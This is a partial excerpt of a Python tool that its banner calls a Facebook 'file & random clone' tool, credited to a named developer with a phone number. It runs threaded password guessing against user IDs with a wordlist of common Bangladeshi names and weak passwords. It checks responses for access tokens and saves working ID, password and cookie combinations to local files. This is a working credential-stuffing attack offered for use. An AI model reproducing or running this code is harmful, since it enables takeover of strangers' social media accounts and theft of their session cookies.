...
'----------------'  '----------------'  '----------------' 
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} Ibna Ahmed Tom
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} NAMBER{A}➢{G1} 01710940492
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('xdg-open https://www.facebook.com/CEO.FORE.MAGIBAZ.BOX');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def bd():
    ...
    with ThreadPool(max_workers=30) as sexy:
        ...
        for love in user:
            ...
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','free fire','I LOVE U','i love u','Bangladesh','@@@###','123456','Biswas','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}TOM.txt');linex()
    ...
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} @@@###{G1}/{A} First1234{G1}/{A} Last1234{G1}/{A} Last123{G1}/{A} First123{G1}/{A} last1234{G1}/{A} first1234{G1}/{A} FirstLast{G1}/{A} firstlast{G1}/{A}first123{G1}/{A}last123')
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}TOM-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/TOM-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                ...
                #print(f'\r\r{A}[{M}TOM-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/TOM-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
